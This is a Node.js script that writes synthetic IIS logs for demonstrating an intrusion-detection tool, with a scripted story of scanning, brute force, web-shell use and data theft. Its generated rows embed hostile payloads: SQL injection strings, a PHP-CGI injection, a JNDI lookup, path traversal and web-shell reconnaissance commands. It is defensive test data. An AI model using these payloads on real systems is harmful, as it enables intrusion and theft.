/* Generates a synthetic IIS W3C Extended log set for demonstrations, screenshots and the manual.
 * Nothing in it comes from a real system: the server is "portal.example.com", internal clients are 10.20.1.x,
 * and every public address is from the documentation ranges 192.0.2.0/24, 198.51.100.0/24 and 203.0.113.0/24.
 *   node tools/make-demo-logs.js [outDir]        (default: demo\LogFiles)  ->  <outDir>\W3SVC1\u_exYYMMDD.log
 * The output is deterministic (fixed seed). Scan it with Settings > "treat documentation ranges as public" turned on
 * (self-test switch /testnets), otherwise the 192.0.2/198.51.100/203.0.113 clients are classed as bogons. Story, all times UTC:
 *   2026-02-01 .. 03-14  normal intranet traffic, remote users, a local health check every 5 minutes, internet noise
 *                        (42 days, so the 30-day baseline of R-WS-001 is established before the intrusion)
 *   2026-03-09 03:12     203.0.113.66 runs Nikto and sqlmap: ~3,600 requests, sensitive files, PHP-CGI, traversal, odd methods
 *   2026-03-10 14:02     203.0.113.45 brute-forces the login page (420 POSTs), logs in, uploads a web shell to /portal/uploads/
 *                        and runs commands through it; the server restarts at 16:20
 *   2026-03-11 02:05     203.0.113.45 enumerates report.ashx?id=..., downloads a 188 MB export and a database backup;
 *                        an internal client runs exec requests late at night
 *   2026-03-12 06:00     logging stops for 5.5 hours (gap) */
'use strict';
var fs = require('fs'), path = require('path');
var outDir = path.join(process.argv[2] || path.join('demo', 'LogFiles'), 'W3SVC1');
fs.mkdirSync(outDir, { recursive: true });

var seed = 20260302;
function rnd() { seed = (seed + 0x6D2B79F5) | 0; var t = Math.imul(seed ^ (seed >>> 15), 1 | seed); t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t; return ((t ^ (t >>> 14)) >>> 0) / 4294967296; }
function ri(a, b) { return a + Math.floor(rnd() * (b - a + 1)); }
function pick(a) { return a[Math.floor(rnd() * a.length)]; }
var CRLF = String.fromCharCode(13, 10), MIN = 60000, HOUR = 3600000, DAY = 86400000;
var FIELDS = 'date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status sc-bytes cs-bytes time-taken';
var SIP = '10.0.0.5', SITE = 'https://portal.example.com';
var UA = {
  chrome: 'Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/128.0.0.0+Safari/537.36',
  edge: 'Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/128.0.0.0+Safari/537.36+Edg/128.0.0.0',
  mac: 'Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+14_6)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/17.6+Safari/605.1.15',
  lb: 'LoadBalancer-HealthCheck/1.0',
  nikto: 'Mozilla/5.0+(Nikto/2.5.0)+(Evasions:None)+(Test:Port+Check)',
  sqlmap: 'sqlmap/1.8.4#stable+(https://sqlmap.org)',
  py: 'python-requests/2.31.0',
  curl: 'curl/8.4.0',
  zgrab: 'Mozilla/5.0+zgrab/0.x',
  jndi: '${jndi:ldap://198.51.100.200:1389/Exploit}'
};
function p2(n) { return (n < 10 ? '0' : '') + n; }
function stamp(t) { var d = new Date(t); return d.getUTCFullYear() + '-' + p2(d.getUTCMonth() + 1) + '-' + p2(d.getUTCDate()) + ' ' + p2(d.getUTCHours()) + ':' + p2(d.getUTCMinutes()) + ':' + p2(d.getUTCSeconds()); }

var days = {}; // day start ms -> rows [t, line]
var GAP_FROM = Date.UTC(2026, 2, 12, 6, 0), GAP_TO = Date.UTC(2026, 2, 12, 11, 30);
function add(t, method, stem, query, port, user, cip, ua, ref, status, sub, win32, scb, csb, taken) {
  if (t >= GAP_FROM && t < GAP_TO) { return; }
  var day = Math.floor(t / DAY) * DAY;
  if (!days[day]) { return; } // outside the generated range
  days[day].push([t, [stamp(t), SIP, method, stem, query || '-', port, user || '-', cip, ua, ref || '-', status, sub || 0, win32 || 0, scb, csb, taken].join(' ')]);
}
var FIRST = Date.UTC(2026, 1, 1), N = 42, d, i;
for (d = 0; d < N; d++) { days[FIRST + d * DAY] = []; }

// ---------- normal traffic ----------
var PAGES = ['/portal/Default.aspx', '/portal/Dashboard.aspx', '/portal/Orders/List.aspx', '/portal/Orders/Detail.aspx', '/portal/Customers/List.aspx',
  '/portal/Customers/Detail.aspx', '/portal/Reports/Default.aspx', '/portal/api/orders.ashx', '/portal/api/customers.ashx', '/portal/Profile.aspx'];
var STATIC = ['/portal/css/site.css', '/portal/js/app.js', '/portal/js/vendor.min.js', '/portal/img/logo.png', '/portal/img/icons.svg', '/favicon.ico'];
function query(stem) {
  if (/Detail\.aspx$/.test(stem)) { return 'id=' + ri(1000, 9999); }
  if (/\.ashx$/.test(stem)) { return 'page=' + ri(1, 40) + '&size=50'; }
  if (/List\.aspx$/.test(stem) && rnd() < 0.3) { return 'q=' + pick(['open', 'shipped', 'pending', 'acme', 'contoso', 'fabrikam']); }
  return '-';
}
function session(cip, ua, start, views) {
  var t = start, ref = '-';
  add(t, 'GET', '/portal/', '-', 443, '', cip, ua, '-', 302, 0, 0, 312, 520, ri(1, 5)); t += ri(200, 900);
  add(t, 'GET', '/portal/Account/Login.aspx', 'ReturnUrl=%2Fportal%2F', 443, '', cip, ua, '-', 200, 0, 0, ri(7800, 8200), 610, ri(20, 90)); t += ri(4000, 15000);
  add(t, 'POST', '/portal/Account/Login.aspx', 'ReturnUrl=%2Fportal%2F', 443, '', cip, ua, SITE + '/portal/Account/Login.aspx', 302, 0, 0, 455, ri(1300, 1700), ri(60, 240)); t += ri(300, 900);
  ref = SITE + '/portal/Account/Login.aspx';
  for (var v = 0; v < views; v++) {
    var stem = v === 0 ? '/portal/Dashboard.aspx' : pick(PAGES), api = /\.ashx$/.test(stem);
    var st = rnd() < 0.004 ? 500 : 200;
    add(t, api && rnd() < 0.2 ? 'POST' : 'GET', stem, query(stem), 443, '', cip, ua, ref, st, 0, 0, api ? ri(2000, 30000) : ri(8000, 60000), ri(450, 900), api ? ri(40, 900) : ri(25, 420));
    if (!api) {
      var ns = ri(0, 3);
      for (var s = 0; s < ns; s++) { var sp = pick(STATIC), hit = rnd() < 0.6; add(t + ri(80, 900), 'GET', sp, '-', 443, '', cip, ua, SITE + stem, hit ? 304 : 200, 0, 0, hit ? 245 : ri(4000, 90000), ri(420, 700), ri(0, 15)); }
      if (rnd() < 0.01) { add(t + ri(80, 900), 'GET', '/portal/img/banner-old.png', '-', 443, '', cip, ua, SITE + stem, 404, 0, 2, 1245, 470, ri(0, 3)); }
      ref = SITE + stem;
    }
    t += ri(8000, 140000);
  }
}
function isWeekend(dayMs) { var w = new Date(dayMs).getUTCDay(); return w === 0 || w === 6; }
for (d = 0; d < N; d++) {
  var day = FIRST + d * DAY, we = isWeekend(day), utcOff = day >= Date.UTC(2026, 2, 8, 7) ? 4 : 5; // New York: EST until 8 March, then EDT
  for (var m = 0; m < 1440; m += 5) { add(day + m * MIN + 2000, 'GET', '/portal/health.aspx', 'probe=1', 80, '', '::1', UA.lb, '-', 200, 0, 0, 312, 180, ri(1, 4)); }
  for (i = 10; i < 40; i++) {
    if (rnd() > (we ? 0.06 : 0.85)) { continue; }
    var n = we ? 1 : ri(1, 3);
    for (var k = 0; k < n; k++) { session('10.20.1.' + i, i % 3 ? UA.chrome : UA.edge, day + (utcOff + 8) * HOUR + ri(0, 9.5 * HOUR), ri(5, 30)); }
  }
  for (i = 10; i < 22; i++) { if (!we && rnd() < 0.5) { session('198.51.100.' + i, i % 2 ? UA.chrome : UA.mac, day + (utcOff + 7) * HOUR + ri(0, 11 * HOUR), ri(4, 25)); } }
  var noise = ri(15, 35);
  for (i = 0; i < noise; i++) {
    var nip = '192.0.2.' + ri(2, 250), nt = day + ri(0, DAY - MIN), what = rnd();
    if (what < 0.5) { add(nt, 'GET', '/', '-', 443, '', nip, pick([UA.zgrab, UA.curl, UA.chrome]), '-', 302, 0, 0, 312, 120, 1); }
    else if (what < 0.8) { add(nt, 'GET', '/robots.txt', '-', 443, '', nip, pick([UA.zgrab, UA.chrome]), '-', 404, 0, 2, 1245, 140, 1); }
    else { add(nt, 'GET', '/.env', '-', 443, '', nip, UA.curl, '-', 404, 0, 2, 1245, 130, 1); }
  }
}

// ---------- 2026-03-09: automated scanning from 203.0.113.66 ----------
(function () {
  var ip = '203.0.113.66', t = Date.UTC(2026, 2, 9, 3, 12, 5);
  var dirs = ['', '/admin', '/backup', '/old', '/test', '/dev', '/api', '/cgi-bin', '/phpmyadmin', '/wp-admin', '/config', '/db', '/logs', '/temp', '/portal', '/portal/admin', '/site', '/www'];
  var files = ['/index.php', '/login.php', '/config.php.bak', '/web.config', '/web.config.bak', '/database.sql', '/backup.zip', '/admin.aspx', '/debug.aspx',
    '/test.asp', '/.env', '/server-status', '/info.php', '/phpinfo.php', '/.git/config', '/.svn/entries', '/wp-config.php', '/install.php', '/setup.aspx', '/elmah.axd', '/trace.axd', '/db.mdb', '/site.tar.gz'];
  for (var a = 0; a < dirs.length; a++) {
    for (var b = 0; b < files.length; b++) {
      for (var rep = 0; rep < 7; rep++) {
        var st = dirs[a] === '/portal' && files[b] === '/web.config' ? 403 : 404;
        add(t, rep % 3 === 2 ? 'HEAD' : 'GET', dirs[a] + files[b] + (rep > 2 ? '.' + pick(['old', 'bak', 'orig', 'save']) : ''), '-', 443, '', ip, UA.nikto, '-', st, st === 403 ? 14 : 0, st === 403 ? 0 : 2, 1245, ri(160, 260), ri(0, 6));
        t += ri(300, 1400);
      }
    }
  }
  var special = [['GET', '/cgi-bin/php-cgi.exe', '%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input', 404, 2], ['POST', '/cgi-bin/php-cgi.exe', '%ADd+cgi.force_redirect%3D0+%ADd+auto_prepend_file%3Dphp://input', 404, 2],
    ['GET', '/portal/..%2f..%2fwindows/win.ini', '-', 400, 0], ['GET', '/autodiscover/autodiscover.json', '@zdi/Powershell', 404, 2], ['PROPFIND', '/', '-', 405, 0], ['TRACE', '/', '-', 405, 0],
    ['FVAJ', '/', '-', 405, 0], ['GET', '/RemoteApplicationMetadata.rem', 'wsdl', 500, 0], ['GET', '/portal/Telerik.Web.UI.WebResource.axd', 'type=rau', 404, 2]];
  for (var s = 0; s < special.length; s++) { add(t, special[s][0], special[s][1], special[s][2], 443, '', ip, UA.nikto, '-', special[s][3], 0, special[s][4], 1245, 300, ri(1, 30)); t += ri(800, 2500); }
  for (var j = 0; j < 20; j++) { add(t, 'GET', '/portal/', '-', 443, '', ip, UA.jndi, '-', 302, 0, 0, 312, 260, 2); t += ri(500, 1500); }
  var inj = ["1%27+OR+%271%27%3D%271", '1+AND+SLEEP(5)', "1%27%3BWAITFOR+DELAY+%270:0:5%27--", '1+UNION+ALL+SELECT+NULL,NULL,NULL--', "1%27+AND+1%3DCONVERT(int,@@version)--"];
  for (var q = 0; q < 420; q++) {
    var bad = rnd() < 0.15;
    add(t, 'GET', '/portal/Orders/Detail.aspx', 'id=' + (1000 + q % 40) + (q % 4 ? pick(inj) : ''), 443, '', ip, UA.sqlmap, '-', bad ? 500 : 302, 0, 0, bad ? 3420 : 312, 420, bad ? ri(5000, 5200) : ri(2, 40));
    t += ri(400, 2200);
  }
}());

// ---------- 2026-03-10: brute force, web shell upload and use from 203.0.113.45 ----------
(function () {
  var ip = '203.0.113.45', t = Date.UTC(2026, 2, 10, 14, 2, 10), i2;
  add(t, 'GET', '/portal/Account/Login.aspx', '-', 443, '', ip, UA.chrome, '-', 200, 0, 0, 7980, 520, 31); t += 3000;
  for (i2 = 0; i2 < 420; i2++) { add(t, 'POST', '/portal/Account/Login.aspx', '-', 443, '', ip, UA.chrome, SITE + '/portal/Account/Login.aspx', 200, 0, 0, ri(9790, 9830), ri(1350, 1450), ri(70, 160)); t += ri(700, 1300); }
  add(t, 'POST', '/portal/Account/Login.aspx', '-', 443, '', ip, UA.chrome, SITE + '/portal/Account/Login.aspx', 302, 0, 0, 455, 1402, 188); t += 900;
  add(t, 'GET', '/portal/Dashboard.aspx', '-', 443, '', ip, UA.chrome, SITE + '/portal/Account/Login.aspx', 200, 0, 0, 41250, 610, 140);
  t = Date.UTC(2026, 2, 10, 14, 15, 3);
  add(t, 'GET', '/portal/Upload/Default.aspx', '-', 443, '', ip, UA.chrome, SITE + '/portal/Dashboard.aspx', 200, 0, 0, 12044, 640, 51); t += 17000;
  add(t, 'POST', '/portal/Upload/Handler.ashx', '-', 443, '', ip, UA.chrome, SITE + '/portal/Upload/Default.aspx', 200, 0, 0, 388, 18422, 312); t += 21000;
  add(t, 'GET', '/portal/uploads/x.aspx', '-', 443, '', ip, UA.py, '-', 200, 0, 0, 1874, 210, 466); t += 30000;
  var cmds = ['whoami', 'whoami+/priv', 'hostname', 'ipconfig+/all', 'net+user', 'net+localgroup+administrators', 'net+group+%22domain+admins%22+/domain', 'systeminfo',
    'tasklist', 'dir+C:%5Cinetpub%5Cwwwroot%5Cportal', 'type+C:%5Cinetpub%5Cwwwroot%5Cportal%5Cweb.config', 'powershell+-nop+-w+hidden+-c+Get-Process',
    'netstat+-ano', 'dir+D:%5CBackups', 'query+user', 'arp+-a'];
  for (i2 = 0; i2 < 38; i2++) {
    var post = i2 % 3 !== 0;
    add(t, post ? 'POST' : 'GET', '/portal/uploads/x.aspx', post ? '-' : 'cmd=' + cmds[i2 % cmds.length], 443, '', ip, UA.py, '-', 200, 0, 0, ri(300, 24000), post ? ri(600, 4000) : 230, ri(120, 2600));
    t += ri(60000, 260000);
  }
}());

// ---------- 2026-03-11: enumeration, exfiltration, after-hours internal activity ----------
(function () {
  var ip = '203.0.113.45', t = Date.UTC(2026, 2, 11, 2, 5, 0), i3;
  for (i3 = 0; i3 < 620; i3++) { add(t, 'GET', '/portal/api/report.ashx', 'id=' + (10001 + i3), 443, '', ip, UA.py, '-', 200, 0, 0, ri(40000, 200000), 240, ri(80, 900)); t += ri(2500, 5500); }
  add(t, 'GET', '/portal/export/orders_full.zip', '-', 443, '', ip, UA.py, '-', 200, 0, 0, 187654321, 250, 96512); t += 110000;
  add(t, 'GET', '/portal/backup/portal_db.bak', '-', 443, '', ip, UA.py, '-', 200, 0, 0, 2147483, 250, 4120);
  t = Date.UTC(2026, 2, 11, 4, 30, 0);
  for (i3 = 0; i3 < 90; i3++) { add(t, 'POST', '/portal/api/orders.ashx', 'page=' + ri(1, 400) + '&size=500', 443, '', '10.20.1.77', UA.edge, '-', 200, 0, 0, ri(80000, 250000), 900, ri(300, 2500)); t += ri(30000, 70000); }
}());

// ---------- write ----------
var files = 0, rows = 0, RESTART = Date.UTC(2026, 2, 10, 16, 20, 0);
Object.keys(days).map(Number).sort(function (a, b) { return a - b; }).forEach(function (day) {
  var list = days[day].sort(function (a, b) { return a[0] - b[0]; }), dt = new Date(day);
  var name = 'u_ex' + String(dt.getUTCFullYear()).substr(2) + p2(dt.getUTCMonth() + 1) + p2(dt.getUTCDate()) + '.log';
  function header(t) { return '#Software: Microsoft Internet Information Services 10.0' + CRLF + '#Version: 1.0' + CRLF + '#Date: ' + stamp(t) + CRLF + '#Fields: ' + FIELDS + CRLF; }
  var text = [header(day)], restarted = false;
  list.forEach(function (r) {
    if (!restarted && day === Math.floor(RESTART / DAY) * DAY && r[0] >= RESTART) { text.push(header(r[0])); restarted = true; }
    text.push(r[1] + CRLF);
  });
  fs.writeFileSync(path.join(outDir, name), text.join(''), 'latin1');
  files++; rows += list.length;
});
console.log('wrote ' + files + ' files, ' + rows + ' rows to ' + outDir);
